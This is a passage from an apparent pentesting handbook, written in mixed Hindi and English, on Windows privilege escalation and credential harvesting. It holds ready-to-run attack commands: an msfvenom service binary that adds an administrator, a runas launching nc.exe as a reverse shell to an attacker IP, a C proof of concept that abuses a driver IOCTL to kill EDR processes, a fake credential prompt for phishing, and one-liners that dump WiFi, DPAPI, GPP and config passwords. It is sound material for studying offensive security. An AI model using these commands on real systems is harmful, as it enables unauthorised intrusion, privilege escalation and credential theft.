)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सर्विस विफल हो तो क्या कार्रवाई की जानी चाहिए। इस फीचर को किसी binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary बदलने योग्य है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **binaries की permissions** (शायद आप किसी को overwrite करके privilege escalation कर सकें) और **folders** की भी। ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

यह जांचें कि क्या आप किसी config file को संशोधित करके किसी विशेष फ़ाइल को पढ़ सकते हैं या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account (schedtasks) द्वारा निष्पादित किया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँचें कि क्या आप किसी ऐसे registry या binary को overwrite कर सकते हैं जिसे किसी दूसरे user द्वारा चलाया जाएगा।**\
**पढ़ें** **निम्नलिखित पृष्ठ** ताकि आप रोचक **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **थर्ड-पार्टी अजीब/कमजोर** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Arbitrary processes को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- किसी भी arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR kill करने की अनुमति मिलती है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए निवारक उपाय
- हमेशा उन device objects को बनाते समय FILE_DEVICE_SECURE_OPEN सेट करें जिन्हें DACL द्वारा प्रतिबंधित किया जाना है।
- प्रिविलेज्ड ऑपरेशनों के लिए कॉलर संदर्भ को मान्य करें। प्रोसेस टर्मिनेशन या हैंडल रिटर्न्स की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

रक्षा करने वालों के लिए पहचान के विचार
- संदिग्ध डिवाइस नामों (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग का संकेत देने वाले विशिष्ट IOCTL अनुक्रमों की निगरानी करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny सूचियाँ बनाए रखें।

## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं, तो आप किसी प्रोसेस द्वारा लोड की गई DLL को hijack कर सकते हैं और **escalate privileges** हासिल कर सकते हैं।

PATH के अंदर सभी फ़ोल्डरों के permissions की जाँच करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के तरीके के बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहरी से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

और[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है।

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी port पर listen कर सकते हैं (जब आप पहली बार किसी port पर listen करने के लिए `nc.exe` का उपयोग करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा allowed किया जाना चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials प्रबंधक / Windows vault

स्रोत [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स संग्रहीत करता है जिन्हें **Windows** स्वचालित रूप से लॉग इन कर सकता है। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook क्रेडेंशियल्स, Twitter क्रेडेंशियल्स, Gmail क्रेडेंशियल्स आदि यहाँ संग्रहीत कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हों। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को संग्रहीत करता है जिनका उपयोग **Windows** स्वचालित रूप से लॉग इन करने के लिए कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server या वेब साइट) **can make use of this Credential Manager** और Windows Vault का उपयोग करके दिए गए क्रेडेंशियल्स का उपयोग कर सकता है, ताकि उपयोगकर्ताओं को बार-बार यूज़रनेम और पासवर्ड न दर्ज करना पड़े।

जब तक applications Credential Manager के साथ इंटरैक्ट नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए संसाधन के लिए क्रेडेंशियल्स का उपयोग कर पाएंगी। इसलिए, यदि आपकी application vault का उपयोग करना चाहती है, तो उसे किसी तरह से **communicate with the credential manager and request the credentials for that resource** करना चाहिए, default storage vault से।

मशीन पर संग्रहीत क्रेडेंशियल्स को सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्न उदाहरण SMB शेयर के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential के सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric encryption का एक तरीका प्रदान करता है, जिसे मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric encryption के लिए उपयोग किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग करता है।

**DPAPI user के login secrets से निकाले गए एक symmetric key के माध्यम से keys के encryption को सक्षम करता है**। system encryption के मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, सामान्यतः 64 bytes की random data से बना होता है। (ध्यान दें कि इस डायरेक्टरी तक पहुँच restricted है, इसलिए इसकी सामग्री को CMD में `dir` कमांड से सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त आर्ग्यूमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे decrypt कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके उन्हें डिक्रिप्ट कर सकते हैं.\
यदि आप root हैं तो `sekurlsa::dpapi` module का उपयोग करके **memory** से कई **DPAPI** **masterkeys** निकाल सकते हैं।


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का अक्सर उपयोग **scripting** और automation कार्यों में, एन्क्रिप्टेड credentials को सुविधाजनक रूप से स्टोर करने के लिए किया जाता है। ये credentials **DPAPI** से संरक्षित होते हैं, जिसका सामान्यतः अर्थ यह है कि इन्हें केवल उसी user द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जहाँ इन्हें बनाया गया था।

जिस फ़ाइल में PS credentials मौजूद हों, उस फ़ाइल से उन्हें **decrypt** करने के लिए आप निम्न कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **डिक्रिप्ट any .rdg files**\
आप मेमोरी से Mimikatz `sekurlsa::dpapi` module के साथ कई **DPAPI masterkeys** निकाल सकते हैं

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **पासवर्ड सहेजने** और अन्य जानकारी के लिए करते हैं, बिना यह जाने कि यह एक database file है। यह फाइल इस स्थान पर स्थित है: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे ढूंढना तथा जाँचना हमेशा उपयोगी होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड recover करने के लिए आपको Administrator होना चाहिए और इसे High Integrity level पर चलाना होगा।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` निर्देशिका में स्थित है।\
यदि यह फाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और इन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर्स **SYSTEM privileges के साथ चलाए जाते हैं**, कई इसके लिए कमजोर हैं **DLL Sideloading (जानकारी स्रोत** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर हो सकते हैं, इसलिए आपको यह जांचना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाकर, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी वाली फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP पासवर्ड

एक ऐसी सुविधा पहले उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से कई मशीनों पर कस्टम स्थानीय administrator खाते तैनात करने की अनुमति देती थी। हालांकि, इस तरीके में गंभीर सुरक्षा कमजोरियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरा, इन GPPs में मौजूद पासवर्ड, जो AES256 का उपयोग कर एक सार्वजनिक रूप से दस्तावेज़ित default key से एन्क्रिप्ट किए गए थे, किसी भी authenticated user द्वारा डिक्रिप्ट किए जा सकते थे। इससे गंभीर जोखिम पैदा होता था, क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए एक function विकसित किया गया था जो locally cached GPP फ़ाइलों को स्कैन करता है जिनमें एक "cpassword" field खाली न हो। ऐसी फ़ाइल मिलने पर, यह function पासवर्ड को डिक्रिप्ट करता है और एक custom PowerShell object रिटर्न करता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरी की पहचान और remediation में मदद करता है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **user से उसके credentials दर्ज करने के लिए या यहाँ तक कि किसी दूसरे user के credentials के लिए पूछ सकते हैं** यदि आपको लगता है कि वह उन्हें जान सकता/सकती है (ध्यान दें कि **पूछना** client से सीधे **credentials** के लिए वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जो credentials शामिल कर सकते हैं**

ऐसी जानी-मानी फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
